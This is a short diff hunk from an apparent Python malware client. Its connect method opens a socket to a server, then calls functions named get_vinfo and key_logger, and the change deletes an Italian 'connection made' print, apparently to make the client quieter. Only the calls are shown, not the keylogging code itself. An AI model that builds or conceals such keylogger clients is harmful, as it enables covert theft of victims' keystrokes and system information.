@@ -35,7 +35,6 @@ class Client:
         This function connect to the server and start basic functions
         """
         self.client.connect((self.host, self.port))
-        print("Connessione effettuata!")
         sleep(1.5)
         self.get_vinfo()
         self.key_logger()
